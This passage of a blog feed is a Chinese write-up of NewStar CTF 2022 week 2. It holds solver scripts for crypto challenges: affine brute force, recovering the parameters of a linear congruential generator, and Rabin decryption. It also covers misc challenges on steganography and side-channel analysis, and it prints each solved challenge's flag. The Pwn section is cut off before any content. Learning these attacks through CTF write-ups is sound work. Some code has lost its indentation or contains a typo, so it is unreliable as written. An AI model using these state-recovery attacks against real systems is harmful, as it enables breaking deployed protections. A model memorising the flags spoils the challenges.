15125087175955104825695156810564987127897848325169422619409907250217748986021456163856515, 18938812620851421852151947331641020281246857664292780502235737631504929833992608716594348, 9469406310425710926075973665820510140623428832146390251117868815752464916996304358297174, 4734703155212855463037986832910255070311714416073195125558934407876232458498152179148587, 13743620610480297170823362342813654252453790709744666755310251210334171570230956724240384, 6871810305240148585411681171406827126226895354872333377655125605167085785115478362120192, 3435905152620074292705840585703413563113447677436166688827562802583542892557739181060096, 1717952576310037146352920292851706781556723838718083344413781401291771446278869590530048, 858976288155018573176460146425853390778361919359041672206890700645885723139434795265024, 429488144077509286588230073212926695389180959679520836103445350322942861569717397632512, 214744072038754643294115036606463347694590479839760418051722675161471430784858698816256, 107372036019377321647057518303231673847295239919880209025861337580735715392429349408128, 53686018009688660823528759151615836923647619959940104512930668790367857696214674704064, 26843009004844330411764379575807918461823809979970052256465334395183928848107337352032, 13421504502422165205882189787903959230911904989985026128232667197591964424053668676016, 6710752251211082602941094893951979615455952494992513064116333598795982212026834338008, 3355376125605541301470547446975989807727976247496256532058166799397991106013417169004, 1677688062802770650735273723487994903863988123748128266029083399698995553006708584502, 838844031401385325367636861743997451931994061874064133014541699849497776503354292251]</span></span><br><span class="line"><span class="comment"># [372992427307339981616536686110115630075342113098010788080347982669869622759400031649792, 284117116837182934114178639859989682847967251175497623662086047895218803240335140835099, 1605652832106941558090105598761930941083559723, 1020259092832776008725259110973662538898604019]</span></span><br><span class="line"><span class="comment"># 1475864207352419823225329328555476398971654057144688193866218781853021651529290611526242518</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;背包密码算法&quot;&gt;背包密码算法&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;以下转自&lt;a href=&quot;https://lazzzaro.github.io/2020/05/13/crypto-%E5%85%B6%E4%BB%96%E5%8A%A0%E5%AF%86%E7</summary>
      
    
    
    
    <category term="Crypto" scheme="https://feverhu.github.io/categories/Crypto/"/>
    
    
    <category term="bag" scheme="https://feverhu.github.io/tags/bag/"/>
    
  </entry>
  
  <entry>
    <title>Newstar-CTF-2022-week2</title>
    <link href="https://feverhu.github.io/2022/11/07/Newstar-CTF-2022-week2/"/>
    <id>https://feverhu.github.io/2022/11/07/Newstar-CTF-2022-week2/</id>
    <published>2022-11-07T14:15:04.000Z</published>
    <updated>2022-11-07T14:17:16.333Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="newstar-ctf-2022-week2-wp">Newstar Ctf 2022| week2 wp</span></h1><p>Newstar Ctf 2022第二周题目的wp。</p><!-- toc --><ul><li><a href="#crypto">Crypto</a><ul><li><a href="#unusual_base">unusual_base</a></li><li><a href="#affine">Affine</a></li><li><a href="#robot">robot</a></li><li><a href="#ezprng">ezPRNG</a></li><li><a href="#ezrabin">ezRabin</a></li></ul></li><li><a href="#misc">Misc</a><ul><li><a href="#yesec-no-drumsticks-2">Yesec no drumsticks 2</a></li><li><a href="#coldwindss-desktop">Coldwinds’s Desktop</a></li><li><a href="#奇怪的二维码">奇怪的二维码</a></li><li><a href="#qsdzs-girlfriend-2">qsdz’s girlfriend 2</a></li><li><a href="#奇怪的波形">奇怪的波形</a></li></ul></li><li><a href="#pwn">Pwn</a><ul><li><a href="#uint32-and-ret">uint32 and ret</a></li><li><a href="#shellcode-revenge">shellcode-revenge</a></li><li><a href="#砍一刀">砍一刀</a></li><li><a href="#buffer-fly">buffer-fly</a></li></ul></li><li><a href="#reverse">Reverse</a><ul><li><a href="#前可见古人后得见来者">前可见古人，后得见来者</a></li><li><a href="#findme">FindME</a></li><li><a href="#petals">Petals</a></li><li><a href="#ur_so_naive">ur_so_naive</a></li><li><a href="#likemyasp">Likemyasp</a></li></ul></li><li><a href="#web">web</a><ul><li><a href="#word-for-you2-gen">Word-For-You(2 Gen)</a></li><li><a href="#includeone">IncludeOne</a></li></ul></li></ul><!-- tocstop --><h2><span id="crypto">Crypto</span></h2><h3><span id="unusual_base">unusual_base</span></h3><p> shuffle()函数是把数组中的元素按随机顺序重新排列。 随机排列后的alphabet给出了，那就直接根据encoded += alphabet[int(bits[i:i+6], 2)]逆向出来就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase, ascii_uppercase, digits</span><br><span class="line"></span><br><span class="line">encoded = <span class="string">&quot;GjN3G$B3de58ym&amp;7wQh9dgVNGQhfG2hndsGjlOyEdaxRFY&quot;</span></span><br><span class="line">alphabet = <span class="string">&quot;c5PKAQmgI&amp;qSdyDZYCbOV2seXGloLwtFW3f9n7j481UMHBp6vNETRJa$rxuz0hik&quot;</span></span><br><span class="line"></span><br><span class="line">bits = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> encoded:</span><br><span class="line">tmp = alphabet.find(i)</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line">bits += (<span class="built_in">bin</span>(tmp)[<span class="number">2</span>:].rjust(<span class="number">6</span>,<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bits += <span class="string">&#x27;0000&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">280</span>, <span class="number">8</span>):</span><br><span class="line">tmp = <span class="built_in">int</span>(bits[i:i + <span class="number">8</span>], <span class="number">2</span>)</span><br><span class="line">flag += (<span class="built_in">chr</span>(tmp))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;a1ph4bet_c0u1d_be_d1ffi3r3nt&#125;</span></span><br></pre></td></tr></table></figure><h3><span id="affine">Affine</span></h3><p>直接爆破吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">b&quot;\xb1\x83\x82T\x10\x80\xc9O\x84\xc9&lt;\x0f\xf2\x82\x9a\xc9\x9b8&#x27;\x9b&lt;\xdb\x9b\x9b\x82\xc8\xe0V&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">8</span>):</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">8</span>):</span><br><span class="line"><span class="keyword">if</span> cipher[<span class="number">0</span>] == (a * <span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>) + b) % <span class="number">0x100</span>:</span><br><span class="line"><span class="keyword">if</span> cipher[<span class="number">1</span>] == (a * <span class="built_in">ord</span>(<span class="string">&#x27;l&#x27;</span>) + b) % <span class="number">0x100</span>:</span><br><span class="line"><span class="keyword">if</span> cipher[<span class="number">2</span>] == (a * <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + b) % <span class="number">0x100</span>:</span><br><span class="line"><span class="built_in">print</span>(a, b)</span><br><span class="line"></span><br><span class="line">a = <span class="number">163</span></span><br><span class="line">b = <span class="number">191</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line"><span class="keyword">if</span> (a * j + b) % <span class="number">0x100</span> == cipher[i]:</span><br><span class="line">flag += <span class="built_in">chr</span>(j)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;Kn0wn_p1aint3xt_4ttack&#125;</span></span><br></pre></td></tr></table></figure><h3><span id="robot">robot</span></h3><p> 直接复制加密函数爆破，但是有随机数生成。那就多爆破两次：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">res = [<span class="string">&#x27;252f10c83610ebca1a059c0bae8255eba2f95be4d1d7bcfa89d7248a82d9f111&#x27;</span>, <span class="number">1495846</span>, <span class="number">1452754</span>, <span class="string">b&#x27;M4======&#x27;</span>, <span class="string">&#x27;021fb596db81e6d02bf3d2586ee3981fe519f275c0ac9ca76bbcf2ebb4097d96&#x27;</span>, <span class="string">&#x27;2e7d2c03a9507ae265ecf5b5356885a53393a2029d241394997265a1a25aefc6&#x27;</span>, <span class="string">&#x27;4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a&#x27;</span>, <span class="string">b&#x27;Tg==&#x27;</span>, <span class="string">&#x27;1b16b1df538ba12dc3f97edbb85caa7050d46c148134290feba80f8236c83db9&#x27;</span>, <span class="string">b&#x27;52304539505430395054303D&#x27;</span>, <span class="string">&#x27;e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8&#x27;</span>, <span class="string">b&#x27;58773D3D&#x27;</span>, <span class="string">&#x27;3f39d5c348e5b79d06e842c114e6cc571583bbf44e4b0ebfda1a01ec05745d43&#x27;</span>, <span class="string">&#x27;4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce&#x27;</span>, <span class="string">&#x27;2e7d2c03a9507ae265ecf5b5356885a53393a2029d241394997265a1a25aefc6&#x27;</span>, <span class="string">b&#x27;T0k9PT09PT0=&#x27;</span>, <span class="string">&#x27;18f5384d58bcb1bba0bcd9e6a6781d1a6ac2cc280c330ecbab6cb7931b721552&#x27;</span>, <span class="string">b&#x27;T0E9PT09PT0=&#x27;</span>, <span class="number">825026</span>, <span class="string">&#x27;d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde&#x27;</span>, <span class="number">1455816</span>, <span class="string">b&#x27;4F553D3D3D3D3D3D&#x27;</span>, <span class="number">1165366</span>, <span class="number">1242964</span>, <span class="string">b&#x27;4F493D3D3D3D3D3D&#x27;</span>, <span class="number">652094</span>, <span class="number">597296</span>, <span class="string">&#x27;4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce&#x27;</span>, <span class="string">&#x27;4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a&#x27;</span>, <span class="string">b&#x27;54314539505430395054303D&#x27;</span>, <span class="number">1242964</span>, <span class="number">368664</span>, <span class="string">b&#x27;TVU9PT09PT0=&#x27;</span>, <span class="string">b&#x27;cw==&#x27;</span>, <span class="number">1602214</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun1</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> sha256(x.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun2</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(<span class="number">114514</span>,<span class="built_in">ord</span>(x),<span class="number">1919810</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun3</span>(<span class="params">x</span>):</span><br><span class="line">    key = random.randint(<span class="number">0</span>,<span class="number">1145141919810</span>)</span><br><span class="line">    ans = x.encode()</span><br><span class="line">    <span class="keyword">if</span> key &amp; <span class="number">1</span>:</span><br><span class="line">        ans = b32encode(ans)</span><br><span class="line">    key &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> key &amp; <span class="number">1</span>:</span><br><span class="line">        ans = b64encode(ans)</span><br><span class="line">    key &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> key &amp; <span class="number">1</span>:</span><br><span class="line">        ans = b16encode(ans)</span><br><span class="line">    key &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> count <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">x = <span class="built_in">chr</span>(j)</span><br><span class="line"><span class="keyword">if</span> res[i] == fun1(x) <span class="keyword">or</span> res[i] == fun2(x):</span><br><span class="line">flag += x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line"><span class="keyword">if</span> res[i] == fun3(x):</span><br><span class="line">flag += x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;c4Nn0t_D3crYpt_buT_r3p34t_Yes&#125;</span></span><br></pre></td></tr></table></figure><h3><span id="ezprng">ezPRNG</span></h3><p>大佬讲的很清楚嘞：<a href="https://blog.csdn.net/weixin_45883223/article/details/115299389">线性同余生成器</a></p><p>有一点需要注意的，如果modinv函数不能够正常返回，那么需要更换crack_unknown_multiplier中states的参数。大佬博客里面是(2,1,1,0)。我这里是(3,2,2,1)。</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from functools import reduce</span><br><span class="line">from functools import reduce</span><br><span class="line">from math import gcd</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">def egcd(a, b):</span><br><span class="line">    if a == 0:</span><br><span class="line">        return (b, 0, 1)</span><br><span class="line">    else:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        return (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">def modinv(a, m):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    if g != 1:</span><br><span class="line">        raise Exception(&#x27;modular inverse does not exist&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        return x % m</span><br><span class="line"></span><br><span class="line">def crack_unknown_increment(states, modulus, multiplier):</span><br><span class="line">    increment = (states[1] - states[0]*multiplier) % modulus</span><br><span class="line">    return modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line">def crack_unknown_multiplier(states, modulus):</span><br><span class="line">    multiplier = (states[3] - states[2]) * modinv(states[2] - states[1], modulus) % modulus</span><br><span class="line">    return crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line">def crack_unknown_modulus(states):</span><br><span class="line">    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]</span><br><span class="line">    modulus = abs(reduce(gcd, zeroes))</span><br><span class="line">    print(modulus)</span><br><span class="line">    return crack_unknown_multiplier(states, modulus)</span><br><span class="line"></span><br><span class="line"># N[i+1] = (A*N[i]+B) % M</span><br><span class="line"># A,B,N均未知</span><br><span class="line">hints = [32579077549265101609729134002322479188058664203229584246639330306875565342934, 30627296760863751873213598737521260410801961411772904859782399797798775242121, 59045755507520598673072877669036271379314362490837080079400207813316110037822, 29714794521560972198312794885289362350476307292503308718904661896314434077717, 3378007627369454232183998646610752441039379051735310926898417029172995488622, 35893579613746468714922176435597562302206699188445795487657524606666534642489]</span><br><span class="line">print(len(hintsezPRNG))</span><br><span class="line">sequence = hints</span><br><span class="line">modulus, multiplier, increment = crack_unknown_modulus(sequence)</span><br><span class="line"></span><br><span class="line">A = 6665518583654864024281280175260135044707462922029971254176205214742119570627</span><br><span class="line">B = 70647661941803021648890247705354664245937054339520114852905142734885854842787</span><br><span class="line">N = 121345174246418575181911383111384744844396268276674523949961216790284235179004</span><br><span class="line"></span><br><span class="line">e = inverse(A, N)</span><br><span class="line">flag = ((hints[0] - B) * e) % N</span><br><span class="line">print(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><h3><span id="ezrabin">ezRabin</span></h3><p>参考大佬的：<a href="https://blog.csdn.net/jcbx_/article/details/101066670">Rabin密钥体制</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">c= 59087040011818617875466940950576089096932769518087477304162753047334728508009365510335057824251636964132317478310267427589970177277870220660958570994888152191522928881774614096675980017700457666192609573774572571582962861504174396725705862549311100229145101667835438230371282904888448863223898642183925834109</span><br><span class="line">p= 10522889477508921233145726452630168129218487981917965097647277937267556441871668611904567713868254050044587941828674788953975031679913879970887998582514571</span><br><span class="line">q= 11287822338267163056031463255265099337492571870189068887689824393221951058498526362126606231275830844407608185240702408947800715624427717739233431252556379</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">def attack(c):</span><br><span class="line">    c1=pow(c,(p+1) // 4 , p)</span><br><span class="line">    c2=pow(c,(q+1) // 4, q)</span><br><span class="line">    cp1=p-c1</span><br><span class="line">    cp2=q-c2</span><br><span class="line">    t1=gmpy2.invert(p,q)#p的模q逆元</span><br><span class="line">    t2=gmpy2.invert(q,p)#q的模p逆元</span><br><span class="line"></span><br><span class="line">    m1=(q*c1*t2+p*c2*t1)%n</span><br><span class="line">    m2=(q*c1*t2+p*cp2*t1)%n # or m2=n-m1</span><br><span class="line">    m3=(q*cp1*t2+p*c2*t1)%n</span><br><span class="line">    m4=(q*cp1*t2+p*cp2*t1)%n # or m4=n-m3</span><br><span class="line"></span><br><span class="line">    m = [m1, m2, m3, m4]</span><br><span class="line">    return m</span><br><span class="line"></span><br><span class="line">m = attack(c)</span><br><span class="line">for i in m:</span><br><span class="line">    m_ = attack(i)</span><br><span class="line">    for j in m_:</span><br><span class="line">        print(long_to_bytes(j &gt;&gt; 300))</span><br></pre></td></tr></table></figure><h2><span id="misc">Misc</span></h2><h3><span id="yesec-no-drumsticks-2">Yesec no drumsticks 2</span></h3><p>解密网站：<a href="http://330k.github.io/misc_tools/unicode_steganography.html">零宽字节隐写</a></p><p>把文档输入decode框， Zero Width Characters for Steganography 选择默认如下：</p><p><img src="1667115687334.png" alt></p><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">86MygAZ2uJi2oCxctsd28LBNRXHPLykF5LBz8f1xEikWNVpKfpce2CMHvhSJUdk7CHLrEVhGRVQvMwT8r7JUgVWGbnzxb</span><br></pre></td></tr></table></figure><p>这是base58。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#666c61677b496e6772336431656e745f30465f59657365635f69355f4f4f4f4f4f7d</span></span><br><span class="line">flag = <span class="string">&#x27;666c61677b496e6772336431656e745f30465f59657365635f69355f4f4f4f4f4f7d&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(flag))</span><br></pre></td></tr></table></figure><h3><span id="coldwindss-desktop">Coldwinds’s Desktop</span></h3><p>montage拼图，gaps排序。每个文件大小30*30的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#montage：apt-get install graphicsmagick-imagemagick-compat</span></span><br><span class="line"><span class="comment">#gaps: https://github.com/nemanja-m/gaps</span></span><br><span class="line"><span class="comment">#gaps安装有点难度。装不上可以搜一下。</span></span><br><span class="line">montage *.PNG -tile 16x9 -geometry +0+0 montage.png</span><br><span class="line"><span class="comment">#注意这里的乘号是x。16x9是桌面比例。</span></span><br><span class="line"></span><br><span class="line">sudo gaps --image=montage.png --generation=30 --population=144 --save</span><br><span class="line"><span class="comment">#我是wsl2的kali，所以加save才能看到输出。</span></span><br></pre></td></tr></table></figure><h3><span id="奇怪的二维码">奇怪的二维码</span></h3><p>这道题想了很久，过了两天才想起来咋做，网上搜下了阿兹台克码，果然是。</p><p>binwalk发现code.png内部还有个png，提取出来是帝国时代2中阿兹台克的介绍。于是搜索<a href="https://baijiahao.baidu.com/s?id=1721078662892636208&amp;wfr=spider&amp;for=pc">阿兹台克码</a>。</p><p>用ps补全。<a href="https://products.aspose.app/barcode/zh-hans/recognize/aztec">阿兹台克码解码地址</a></p><p><img src="1667117618324.png" alt></p><h3><span id="qsdzs-girlfriend-2">qsdz’s girlfriend 2</span></h3><p>女朋友2这道题，仔细看里面的n,a,b。合在一起是<a href="https://zhuanlan.zhihu.com/p/90483213">arnold编码</a>提示找到脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arnold_decode</span>(<span class="params">image, shuffle_times, a, b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; decode for rgb image that encoded by Arnold</span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        image: rgb image encoded by Arnold</span></span><br><span class="line"><span class="string">        shuffle_times: how many times to shuffle</span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        decode image</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1:创建新图像</span></span><br><span class="line">    decode_image = np.zeros(shape=image.shape,dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2：计算N</span></span><br><span class="line">    h, w = image.shape[<span class="number">0</span>], image.shape[<span class="number">1</span>]</span><br><span class="line">    N = h  <span class="comment"># 或N=w</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3：遍历像素坐标变换</span></span><br><span class="line">    <span class="keyword">for</span> time <span class="keyword">in</span> <span class="built_in">range</span>(shuffle_times):</span><br><span class="line">        <span class="keyword">for</span> ori_x <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">            <span class="keyword">for</span> ori_y <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">                <span class="comment"># 按照公式坐标变换</span></span><br><span class="line">                new_x = ((a * b + <span class="number">1</span>) * ori_x + (-b) * ori_y) % N</span><br><span class="line">                new_y = ((-a) * ori_x + ori_y) % N</span><br><span class="line">                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]</span><br><span class="line">    <span class="keyword">return</span> decode_image</span><br><span class="line"></span><br><span class="line">img = cv2.imread(<span class="string">&quot;1.png&quot;</span>)  <span class="comment">#变换的图片</span></span><br><span class="line">a = <span class="number">0x726e</span></span><br><span class="line">b = <span class="number">0x6f6c64</span></span><br><span class="line">st = <span class="number">3</span></span><br><span class="line">pic = arnold_decode(img,st,a,b)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;i&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;.png&#x27;</span>,pic)  <span class="comment">#保存得到的图片</span></span><br><span class="line"><span class="comment">#flag&#123;按理说这个点猪也该醒了&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="奇怪的波形">奇怪的波形</span></h3><p>这道题本来看不懂，但是出题人群里面提示了一下，秒懂。根据出题人意思，如果key[i] == 0，那么执行那么两个相邻的波峰形态都应该一样的，因为执行的代码相同。如果key[i] == 1，那么两个相邻波峰形态应该是不同的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">for (i = 0; i &lt; 16; i++)</span><br><span class="line">&#123;</span><br><span class="line">    tmp = S * S;</span><br><span class="line">    S = tmp % N;</span><br><span class="line">    if (key[i] == 1)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp = S * m;</span><br><span class="line">        S = tmp % N;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        tmp = S * S;</span><br><span class="line">        S = tmp % N;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">return m, S;</span><br><span class="line">#flag&#123;0010001001100111&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="1667119194480.png" alt></p><h2><span id="pwn">Pwn</span></h2><h3><span id="uint32-and-ret">uint32 and 